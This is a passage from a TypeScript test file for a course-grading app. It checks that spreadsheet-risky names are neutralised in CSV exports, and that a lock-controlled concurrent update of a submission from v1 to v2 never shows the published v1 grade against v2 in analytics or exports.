    expect(exportedNames).toEqual(riskyNames.map((n) => `\t${n}`));

    // Verify stored database rows were NOT mutated
    const storedMilestone = await prisma.milestone.findUniqueOrThrow({ where: { id: mRisky.id } });
    expect(storedMilestone.title).toBe('＠FullwidthAtMilestone');
    for (const name of riskyNames) {
      const found = await prisma.projectTeam.findFirst({ where: { courseId: f.course.id, name } });
      expect(found).not.toBeNull();
    }
  });

  it('S3-F08-T10 (S3-F08-AC09): barrier-controlled concurrent submission version update cannot attach v1 published grade to v2 in analytics or CSV export', async () => {
    await prisma.projectProposal.update({
      where: { teamId: f.teamAlpha.id },
      data: { status: 'APPROVED' },
    });
    const m1 = await prisma.milestone.create({
      data: {
        courseId: f.course.id,
        title: 'Concurrency Snapshot Milestone',
        description: 'Barrier-controlled v1->v2 snapshot test',
        dueDate: new Date(fixedNow + 60000),
        status: 'PUBLISHED',
        publishedAt: new Date(fixedNow - 10000),
      },
    });

    // Initial state: v1 submitted and graded with published score 91
    const sub = await prisma.milestoneSubmission.create({
      data: {
        milestoneId: m1.id,
        teamId: f.teamAlpha.id,
        version: 1,
        artifactUrl: 'https://example.org/v1',
        reportUrl: 'https://example.org/r1',
        releaseTag: 'v1',
        submittedAt: new Date(fixedNow - 5000),
        dueDateSnapshot: m1.dueDate,
        lateStatus: 'ON_TIME',
      },
    });
    await prisma.submissionVersion.create({
      data: {
        submissionId: sub.id,
        version: 1,
        repoUrl: 'https://example.org/v1',
        reportUrl: 'https://example.org/r1',
        releaseTag: 'v1',
        submittedAt: new Date(fixedNow - 5000),
        dueDateSnapshot: m1.dueDate,
        lateStatus: 'ON_TIME',
      },
    });
    const evalV1 = await prisma.submissionEvaluation.create({
      data: {
        submissionId: sub.id,
        submissionVersion: 1,
        score: 91,
        feedback: 'Published v1 grade',
        version: 2,
        draftRevision: 1,
        publishedDraftRevision: 1,
        updatedById: f.instructor.id,
      },
    });
    await prisma.gradePublication.create({
      data: {
        evaluationId: evalV1.id,
        submissionId: sub.id,
        submissionVersion: 1,
        draftRevision: 1,
        score: 91,
        feedback: 'Published v1 grade',
        publishedById: f.instructor.id,
      },
    });

    // Hold a row lock on MilestoneSubmission while upgrading submission to v2 inside a transaction
    let releaseLock!: () => void;
    let lockAcquired!: () => void;
    const gate = new Promise<void>((resolve) => {
      releaseLock = resolve;
    });
    const ready = new Promise<void>((resolve) => {
      lockAcquired = resolve;
    });

    const writer = prisma.$transaction(
      async (tx) => {
        await tx.$queryRaw`SELECT "id" FROM "MilestoneSubmission" WHERE "id" = ${sub.id} FOR UPDATE`;
        await tx.submissionVersion.create({
          data: {
            submissionId: sub.id,
            version: 2,
            repoUrl: 'https://example.org/v2',
            reportUrl: 'https://example.org/r2',
            releaseTag: 'v2',
            submittedAt: new Date(fixedNow),
            dueDateSnapshot: m1.dueDate,
            lateStatus: 'ON_TIME',
          },
        });
        await tx.milestoneSubmission.update({
          where: { id: sub.id },
          data: {
            version: 2,
            artifactUrl: 'https://example.org/v2',
            reportUrl: 'https://example.org/r2',
            releaseTag: 'v2',
            submittedAt: new Date(fixedNow),
          },
        });
        lockAcquired();
        await gate;
      },
      { timeout: 10000 }
    );

    await ready;
    const analyticsPromise = getAnalytics(f.course.id).then((r) => r);
    const csvPromise = getCsv(f.course.id).then((r) => r);

    let blocked = false;
    try {
      for (let attempt = 0; attempt < 100; attempt++) {
        const waiting = await prisma.$queryRaw<Array<{ count: bigint }>>`
          SELECT count(*) AS count FROM pg_stat_activity
          WHERE datname = current_database() AND wait_event_type = 'Lock'
        `;
        if (Number(waiting[0].count) >= 2) {
          blocked = true;
          break;
        }
        await new Promise((resolve) => setTimeout(resolve, 10));
      }
    } finally {
      releaseLock();
      await writer;
    }

    const [analyticsRes, csvRes] = await Promise.all([analyticsPromise, csvPromise]);
    expect(blocked).toBe(true);
    expect(analyticsRes.status).toBe(200);
    expect(analyticsRes.body.totals.gradedDeliverables).toBe(0);
    expect(analyticsRes.body.totals.ungradedDeliverables).toBe(1);
    expect(analyticsRes.body.ungraded).toEqual([
      expect.objectContaining({
        submissionId: sub.id,
        submissionVersion: 2,
      }),
    ]);

    expect(csvRes.status).toBe(200);
    const csvRows = parseQuotedCsv(csvRes.text);
    const alphaRow = csvRows.find((r) => r[1] === String(f.teamAlpha.id))!;
    expect(alphaRow[9]).toBe('2'); // submissionVersion = 2
    expect(alphaRow[12]).toBe(''); // publishedScore must be empty for v2, never 91 from v1
    expect(alphaRow[13]).toBe('');
  });
});
